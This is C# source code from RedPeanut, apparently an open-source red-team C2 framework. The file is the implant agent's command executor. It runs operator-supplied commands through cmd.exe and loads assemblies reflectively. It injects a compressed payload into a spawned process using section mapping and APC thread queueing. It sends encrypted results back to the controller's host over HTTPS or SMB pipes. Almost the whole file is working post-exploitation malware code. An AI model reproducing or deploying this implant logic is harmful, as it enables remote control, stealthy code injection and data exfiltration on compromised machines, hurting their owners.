//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using System;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using static RedPeanutAgent.Program;

namespace RedPeanutAgent.Execution
{
    class CommandExecuter
    {
        Core.Utility.TaskMsg task;
        NamedPipeClientStream pipe;
        Core.Utility.CookiedWebClient wc;
        byte[] aeskey;
        byte[] aesiv;
        string agentid;
        string processname;
        string host;
        int port;
        string[] pagepost;
        string[] pageget;
        string param;

        Worker worker;

        public CommandExecuter(Core.Utility.TaskMsg task, Worker w)
        {
            this.task = task;
            pipe = w.pipe;
            wc = w.wc;
            aeskey = w.aeskey;
            aesiv = w.aesiv;
            agentid = w.agentid;
            processname = w.spawnp;
            host = w.host;
            port = w.port;
            pagepost = w.pagepost;
            pageget = w.pageget;
            param = w.param;
            worker = w;
        }

        public void SendResponse(string output)
        {
            if (string.IsNullOrEmpty(output))
            {
                output = "\n";
            }

            string rpaddress = String.Format("https://{0}:{1}/{2}", host, port, pagepost[new Random().Next(pagepost.Length)]);
            if (pipe != null)
            {
                RedPeanutAgent.Core.Utility.SendOutputSMB(output, aeskey, aesiv, pipe);
            }
            else
            {
                RedPeanutAgent.Core.Utility.SendOutputHttp(task.Instanceid, output, wc, aeskey, aesiv, rpaddress, param, agentid);
            }
        }

        public void ExecuteCmd()
        {
            string output;
            string command = task.CommandTask.Command;

            var processStartInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c " + command,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false

            };
            try
            {
                var process = Process.Start(processStartInfo);
                output = process.StandardOutput.ReadToEnd();
                output += process.StandardError.ReadToEnd();
                process.WaitForExit();

            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                output = e.Message;
            }
            SendResponse(output);
        }

        public void ExecuteModuleManaged()
        {
            string output = "";
            try
            {
                StringBuilder myb = new StringBuilder();
                StringWriter sw = new StringWriter(myb);
                TextWriter oldOut = Console.Out;
                Console.SetOut(sw);
                Console.SetError(sw);

                string classname;
                string assembly;
                string method;
                string[] paramsv;

                switch (task.TaskType)
                {
                    case "standard":
                        classname = task.StandardTask.Moduleclass;
                        assembly = task.StandardTask.Assembly;
                        method = task.StandardTask.Method;
                        paramsv = task.StandardTask.Parameters;
                        RedPeanutAgent.Core.Utility.RunAssembly(assembly, classname, method, new object[] { paramsv });
                        break;
                    case "download":
                        classname = task.DownloadTask.Moduleclass;
                        assembly = task.DownloadTask.Assembly;
                        method = task.DownloadTask.Method;
                        paramsv = task.DownloadTask.Parameters;
                        RedPeanutAgent.Core.Utility.RunAssembly(assembly, classname, method, new object[] { paramsv });
                        break;
                    case "migrate":
                        classname = task.ModuleTask.Moduleclass;
                        assembly = task.ModuleTask.Assembly;
                        method = task.ModuleTask.Method;
                        paramsv = task.ModuleTask.Parameters;
                        RedPeanutAgent.Core.Utility.RunAssembly(assembly, classname, method, new object[] { paramsv });
                        break;
                    case "module":
                        classname = task.ModuleTask.Moduleclass;
                        assembly = task.ModuleTask.Assembly;
                        method = task.ModuleTask.Method;
                        paramsv = task.ModuleTask.Parameters;
                        RedPeanutAgent.Core.Utility.RunAssembly(assembly, classname, method, new object[] { paramsv });
                        break;
                }

                output = myb.ToString();

                Console.SetOut(oldOut);
                Console.SetError(oldOut);
                sw.Flush();
                sw.Close();

            }
            catch (Exception e)
            {
                if (e.InnerException != null)
                {
                    try
                    {
                        Type newextype = Type.GetType(e.InnerException.GetType().FullName);
                        RedPeanutAgent.Core.Utility.EndOfLifeException newex = (RedPeanutAgent.Core.Utility.EndOfLifeException)Activator.CreateInstance(newextype);
                        throw newex;
                    }
                    catch (InvalidCastException ex)
                    {
                    }
                    catch (ArgumentNullException ex)
                    {
                    }
                }
                output = e.Message;
            }
            SendResponse(output);
        }

        public void ExecuteModuleUnManaged()
        {

            string output = "";

            IntPtr hReadPipe = IntPtr.Zero;
            IntPtr hWritePipe = IntPtr.Zero;
            if (!Spawner.CreatePipe(ref hReadPipe, ref hWritePipe))
            {
                return;
            }

            Core.Natives.PROCESS_INFORMATION procInfo = new Core.Natives.PROCESS_INFORMATION();
            if (!Spawner.CreateProcess(hReadPipe, hWritePipe, this.processname, true, ref procInfo))
            {
                return;
            }

            string pipename = GetPipeName(procInfo.dwProcessId);
            InjectionLoaderListener injectionLoaderListener = new InjectionLoaderListener(pipename, task);

            byte[] payload = Core.Utility.DecompressDLL(Convert.FromBase64String(worker.nutclr));

            //Round payload size to page size
            uint size = InjectionHelper.GetSectionSize(payload.Length);

            //Crteate section in current process
            IntPtr section = IntPtr.Zero;
            section = InjectionHelper.CreateSection(size, Core.Natives.PAGE_READWRITE);
            if (section == IntPtr.Zero)
            {
                return;
            }

            //Map section to current process
            IntPtr baseAddr = IntPtr.Zero;
            IntPtr viewSize = (IntPtr)size;
            InjectionHelper.MapViewOfSection(section, Core.Natives.GetCurrentProcess(), ref baseAddr, ref viewSize, Core.Natives.PAGE_READWRITE);
            if (baseAddr == IntPtr.Zero)
            {
                return;
            }

            //Copy payload to current process section
            Marshal.Copy(payload, 0, baseAddr, payload.Length);

            //Map remote section
            IntPtr baseAddrEx = IntPtr.Zero;
            IntPtr viewSizeEx = (IntPtr)size;
            InjectionHelper.MapViewOfSection(section, procInfo.hProcess, ref baseAddrEx, ref viewSizeEx, Core.Natives.PAGE_EXECUTE);
            if (baseAddrEx == IntPtr.Zero || viewSizeEx == IntPtr.Zero)
            {
                Console.WriteLine("Error mapping section remote " + Core.Natives.GetLastError());
                return;
            }

            if (!InjectionHelper.UnMapViewOfSection(baseAddr))
            {
                return;
            }

            // Assign address of shellcode to the target thread apc queue
            if (!InjectionHelper.QueueApcThread(baseAddrEx, procInfo))
            {
                return;
            }

            IntPtr infoth = InjectionHelper.SetInformationThread(procInfo);
            if (infoth == IntPtr.Zero)
            {
                return;
            }

            InjectionHelper.ResumeThread(procInfo);

            output = injectionLoaderListener.Execute(procInfo.hProcess, hReadPipe);

            Core.Natives.CloseHandle(procInfo.hThread);
            Core.Natives.CloseHandle(procInfo.hProcess);

            SendResponse(output);
        }

        public static string GetPipeName(int pid)
        {
            string pipename = Dns.GetHostName();
            pipename += pid.ToString();
            return pipename;

        }

    }
}
